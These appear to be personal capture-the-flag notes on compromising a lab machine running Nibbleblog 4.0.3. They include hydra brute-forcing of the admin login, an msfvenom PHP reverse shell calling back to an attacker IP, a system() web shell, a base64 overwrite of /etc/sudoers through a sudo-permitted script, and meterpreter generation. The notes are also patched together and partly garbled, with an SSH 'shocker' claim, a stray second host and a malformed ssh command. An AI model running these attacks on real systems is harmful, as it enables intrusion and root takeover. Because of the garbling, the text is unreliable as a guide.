### nmap
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)

80/tcp open  http Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

### Have checked port 80 -- nothing
```
suspicious: port 22 -- OpenSSH 7.2p2 Ubuntu 4ubuntu22 -- shocker vulnerability.
```
```
If we're given ssh and an HTTP server as possible attack vectors, we can almost always assume the HTTP server is the target. Vulnerabilities in SSH aren't too common and generally won't be found on challenges ranked easy. 

That being said, let's dive into this HTTP server. Navigating to http://10.10.10.75/ brings us to a page simply saying Hello World!, but after looking at the page source we see the following:
```

### gobuster
```
gobuster discover /admin.php
```

once see admin login page, try to guess/google default password

### hydra
or set up hydra to start a dictionary attack against this login. The syntax for this attack is as follows: [https://www.kali.org/tools/hydra/](https://www.kali.org/tools/hydra/)
```
hydra -P /usr/share/wordlists/nmap.lst -l admin 10.10.10.75 http-post-form "/nibbleblog/admin.php:username=^USER^&password=^PASS^:Incorrect"
```

### searchsploit
With access to the admin console as well as the version information, we are well on our way to our initial shell. Using searchsploit we can check for public exploits:
```
searchsploit nibbleblog 4.0.3
```

Remember to read the exploit -- for this case, i know that an attacker can use the plugin My image to upload a php file and then execute it at http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php. 
(there're public & private directories, although public contains 'upload'-- but only image, and private directory has PHP files)

### initial shell
we'll need a reverse shell to upload. To do this we'll use msfvenom to generate the payload:
```
echo '<?php' > evil.php && msfvenom -p php/reverse_php LHOST=10.10.14.7 LPORT=31337 -f raw >> evil.php && echo '?>' >> evil.php
```

### escalation
### sudo -l
to check if there's passwordless sudo access to anything:
```
sudo -l
```
```
Matching Defaults entries for nibbler on Nibbles:
 env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
 (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

### SSH port-forwarding:
```
ssh -i user@password -L9000:10.10.10.75:80 10.10.10.73
```
(ssh credentials from .73, by doing this, u will have .73 as ur local ip)
```
cmd.php -- to test if can get a shell back, if yes, next step will be replace it with a reverse shell script to get the shell)
```
```
<?php echo system ($_REQUEST['ipp']); ?>
```
### on burp control+u safe encoding

### overwriting /etc/sudoers file with base64
### [use cyberchef](https://gchq.github.io/CyberChef/#recipe=To_Base64('A-Za-z0-9%2B/%3D'))
making myself sudo user by adding myself to /etc/sudoers file without password
```
nibbler ALL=(ALL) NOPASSWD:ALL
bmliYmxlciAgICAgQUxMPShBTEwpIE5PUEFTU1dEOkFMTA==
```
i want monitor.sh to help me write to /etc/sudoers file with this command:
```
echo "bmliYmxlciAgICAgQUxMPShBTEwpIE5PUEFTU1dEOkFMTA==" | base64 -d > /etc/sudoers
```
i use the same base64 method to overwrite monitor.sh with the above command:
```
echo "ZWNobyAiYm1saVlteGxjaUFnSUNBZ1FVeE1QU2hCVEV3cElFNVBVRUZUVTFkRU9rRk1UQT09IiB8IGJhc2U2NCAtZCA+PiAvZXRjL3N1ZG9lcnM=" | base64 -d > monitor.sh
```

### generate meterpreter shell:
```
┌──(kali㉿kali)-[~/osep/pepe/prep/10_linux_post_exploitation]
└─$ python3 makewrap.py -a 64 -l 10.10.14.7 -p 4443
```